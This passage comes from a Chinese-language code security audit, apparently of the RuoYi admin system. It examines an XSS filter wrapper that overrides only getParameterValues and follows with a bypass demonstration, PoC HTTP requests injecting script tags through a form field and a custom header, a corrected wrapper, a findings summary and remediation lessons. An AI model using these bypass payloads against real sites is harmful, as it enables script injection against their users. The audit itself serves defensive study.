    public XssHttpServletRequestWrapper(HttpServletRequest request) {
        super(request);
    }

    // ✅ 重写了getParameterValues
    @Override
    public String[] getParameterValues(String name) {
        String[] values = super.getParameterValues(name);
        if (values != null) {
            int length = values.length;
            String[] escapseValues = new String[length];
            for (int i = 0; i < length; i++) {
                // 使用Jsoup进行XSS过滤
                escapseValues[i] = Jsoup.clean(values[i], Whitelist.relaxed()).trim();
            }
            return escapseValues;
        }
        return super.getParameterValues(name);
    }

    // ❌ 关键缺陷: 没有重写以下方法
    // getParameter(String name)
    // getParameterMap()
    // getHeader(String name)
    // getQueryString()
}
```

#### 绕过演示

```java
// Controller代码
@PostMapping("/notice/add")
public String add(SysNotice notice) {
    // ❌ 如果SysNotice的属性是通过request.getParameter()获取的，会绕过XSS过滤
    String title = notice.getTitle();  // 没有被XSS过滤！
    return noticeService.insertNotice(notice);
}

// Spring MVC数据绑定内部可能使用getParameter()而非getParameterValues()
// 导致XSS过滤被绕过
```

#### PoC

```bash
# 正常情况（被过滤）
POST /system/notice/add HTTP/1.1
Content-Type: application/x-www-form-urlencoded

noticeTitle=<script>alert(1)</script>&noticeContent=test

# 结果: 如果使用getParameterValues()会被过滤
# 但如果使用getParameter()则不会被过滤

# 通过Header注入（完全不过滤）
POST /system/notice/add HTTP/1.1
X-Custom-Data: <script>alert(1)</script>

// Controller中如果有:
String customData = request.getHeader("X-Custom-Data");  // ❌ 完全绕过
```

#### 修复方案

```java
// ✓ 完整的XSS过滤器
public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper {

    @Override
    public String getParameter(String name) {
        String value = super.getParameter(name);
        return cleanXSS(value);
    }

    @Override
    public String[] getParameterValues(String name) {
        String[] values = super.getParameterValues(name);
        if (values == null) {
            return null;
        }
        String[] escapedValues = new String[values.length];
        for (int i = 0; i < values.length; i++) {
            escapedValues[i] = cleanXSS(values[i]);
        }
        return escapedValues;
    }

    @Override
    public Map<String, String[]> getParameterMap() {
        Map<String, String[]> rawMap = super.getParameterMap();
        Map<String, String[]> cleanMap = new HashMap<>();
        for (Map.Entry<String, String[]> entry : rawMap.entrySet()) {
            String[] cleanValues = new String[entry.getValue().length];
            for (int i = 0; i < entry.getValue().length; i++) {
                cleanValues[i] = cleanXSS(entry.getValue()[i]);
            }
            cleanMap.put(entry.getKey(), cleanValues);
        }
        return cleanMap;
    }

    @Override
    public String getHeader(String name) {
        String value = super.getHeader(name);
        return cleanXSS(value);
    }

    @Override
    public String getQueryString() {
        String value = super.getQueryString();
        return cleanXSS(value);
    }

    private String cleanXSS(String value) {
        if (value == null) {
            return null;
        }
        return Jsoup.clean(value, Whitelist.relaxed()).trim();
    }
}
```

---

## 审计总结

### 发现统计

| 严重程度 | 数量 | 占比 |
|---------|------|------|
| Critical | 1 | 10% |
| High | 2 | 20% |
| Medium | 4 | 40% |
| Low | 3 | 30% |
| **总计** | **10** | **100%** |

### 关键教训

1. **文件操作必须验证**
   - 路径拼接前必须规范化（getCanonicalPath）
   - 检查路径是否在允许范围内
   - 禁止../遍历

2. **MyBatis ${} 绝对危险**
   - 即使数据来自内部，也应使用 #{}
   - AOP切面中的SQL拼接尤其危险
   - 优先使用foreach、list参数传递

3. **过滤器必须完整**
   - 重写HttpServletRequest的所有输入获取方法
   - 测试多种数据绑定方式
   - 排除路径要最小化

4. **配置文件是宝藏**
   - 硬编码密码
   - 监控端点暴露
   - 过时依赖版本

---

## 参考资源

- [Hello-Java-Sec 项目](https://github.com/j3ers3/Hello-Java-Sec)
- [若依管理系统](http://www.ruoyi.vip)
- [Java Security CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Java_Security_Cheat_Sheet.html)
- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
